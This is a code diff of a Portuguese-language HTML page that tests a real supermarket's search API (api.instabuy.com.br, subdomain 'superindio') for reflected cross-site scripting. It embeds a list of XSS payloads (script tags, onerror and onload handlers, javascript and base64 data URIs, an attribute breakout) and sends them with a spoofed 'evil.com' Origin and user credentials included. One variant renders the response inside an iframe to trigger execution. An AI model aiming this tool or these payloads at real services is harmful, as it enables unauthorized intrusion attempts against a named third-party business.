@@ -2,38 +2,121 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <title>Teste XSS reflexivo</title>
+  <title>Teste XSS Avançado</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+    #result { margin-top: 20px; padding: 10px; border: 1px solid #ddd; min-height: 100px; }
+    .payload { cursor: pointer; color: blue; margin: 5px 0; }
+    .payload:hover { text-decoration: underline; }
+    iframe { width: 100%; height: 300px; border: 1px solid #ccc; margin-top: 10px; }
+  </style>
 </head>
 <body>
-  <h1>Teste XSS Reflexivo - Supermercado Índio</h1>
-  <form id="form" action="#" onsubmit="return false;">
-    <label>Pesquisa (testar XSS):</label><br/>
-    <input type="text" id="searchInput" placeholder="Digite payload XSS" size="40" />
-    <button onclick="testXSS()">Testar</button>
+  <h1>Teste XSS Avançado - Supermercado Índio</h1>
+  
+  <div>
+    <h3>Payloads Pré-Definidos:</h3>
+    <div id="payloads">
+      <!-- Payloads serão inseridos aqui pelo JavaScript -->
+    </div>
+  </div>
+
+  <form id="form">
+    <label>Teste Customizado:</label><br/>
+    <input type="text" id="searchInput" placeholder="Digite payload XSS" size="50" />
+    <button type="button" onclick="testXSS()">Testar</button>
+    <button type="button" onclick="testInIframe()">Testar em Iframe</button>
   </form>
 
-  <div id="result" style="margin-top: 20px; font-family: monospace;"></div>
+  <div>
+    <h3>Resultado:</h3>
+    <div id="result"></div>
+    <iframe id="resultFrame" sandbox="allow-scripts"></iframe>
+  </div>
 
   <script>
+    // Payloads para testar diferentes contextos
+    const payloads = [
+      { name: "Script Básico", value: "<script>alert(1)</script>" },
+      { name: "Img Error", value: "<img src=x onerror=alert(1)>" },
+      { name: "SVG", value: "<svg onload=alert(1)>" },
+      { name: "JavaScript URI", value: "javascript:alert(1)" },
+      { name: "Event Handler", value: "\" onfocus=\"alert(1)\" autofocus=\"" },
+      { name: "Template Literal", value: "${alert(1)}" },
+      { name: "Unicode XSS", value: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e" },
+      { name: "Base64 XSS", value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" }
+    ];
+
+    // Carrega payloads na página
+    function loadPayloads() {
+      const container = document.getElementById('payloads');
+      payloads.forEach(payload => {
+        const div = document.createElement('div');
+        div.className = 'payload';
+        div.textContent = `${payload.name}: ${payload.value}`;
+        div.onclick = () => {
+          document.getElementById('searchInput').value = payload.value;
+        };
+        container.appendChild(div);
+      });
+    }
+
+    // Testa XSS via fetch
     async function testXSS() {
       const payload = document.getElementById('searchInput').value;
       const url = `https://api.instabuy.com.br/apiv3/search?subdomain=superindio&query=${encodeURIComponent(payload)}`;
       
+      document.getElementById('result').innerHTML = 'Testando...';
+      
       try {
         const res = await fetch(url, {
           method: 'GET',
-          headers: {
-            'Origin': 'https://evil.com'
-          },
+          headers: { 'Origin': 'https://evil.com' },
           credentials: 'include'
         });
-
         const text = await res.text();
+        
+        // Exibe resultado cru (encoded para segurança)
         document.getElementById('result').textContent = text;
+        
+        // Verifica se o payload foi refletido sem encoding
+        if (text.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'))) {
+          console.log('Payload refletido com encoding');
+        } else if (text.includes(payload)) {
+          console.warn('Possível vulnerabilidade XSS - Payload refletido sem encoding!');
+        }
       } catch (e) {
         document.getElementById('result').textContent = 'Erro: ' + e.message;
       }
     }
+
+    // Testa XSS em iframe (simula execução real)
+    function testInIframe() {
+      const payload = document.getElementById('searchInput').value;
+      const url = `https://api.instabuy.com.br/apiv3/search?subdomain=superindio&query=${encodeURIComponent(payload)}`;
+      
+      const iframe = document.getElementById('resultFrame');
+      iframe.srcdoc = `
+        <html>
+        <body>
+          <script>
+            fetch('${url.replace(/'/g, "\\'")}', {
+              headers: { 'Origin': 'https://evil.com' },
+              credentials: 'include'
+            })
+            .then(r => r.text())
+            .then(t => {
+              document.body.innerHTML = t;
+              console.log('Conteúdo carregado');
+            });
+          </script>
+        </body>
+        </html>
+      `;
+    }
+
+    // Inicializa a página
+    window.onload = loadPayloads;
   </script>
 </body>
 </html>
